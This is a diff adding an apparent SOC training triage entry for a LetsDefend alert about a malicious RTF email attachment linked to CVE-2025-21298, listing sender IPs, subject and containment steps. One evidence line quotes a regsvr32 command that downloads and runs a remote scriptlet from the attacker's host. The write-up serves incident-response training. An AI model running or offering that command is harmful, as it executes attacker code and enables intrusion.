@@ -86,6 +86,24 @@ OR
 
 **Target:** Austin@letsdefend.io
 
+**Hypothesis:** Malicious RTF attachment identified with known CVE-2025-21298 exploit pattern.
+
+**Evidence:** 
+-On 2025-02-04 6:18:08 AM our host "Austin" was sent an email containing suspicious malicious  attachment "mail.rtf". 
+-The subject of the email was "Important: Action Required for Upcoming Project Deadline". 
+-The SMTP address of the sender "84.38.130.118" was found to be malicious with C2/Latvia , which belonged to SIA RixHost .
+-The source address from "projectmanagement@pm.me" with an IP address  "185.70.42.45" was found to be suspicious . 
+-The hash address from which it was send was found to be malicious and belonged to contained mail.rtf . Attackers have historically used RTF documents to deliver or trigger malicious content. 
+-The given command "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll" was found suspicious and an indicator of regsvr32.exe abuse . 
+
+**Action taken:** We have contained the action for further assessment and deleted the email from the host mail.
+
+**Time of triage:** 20mins 
+
+
+
+
+
 
 
 
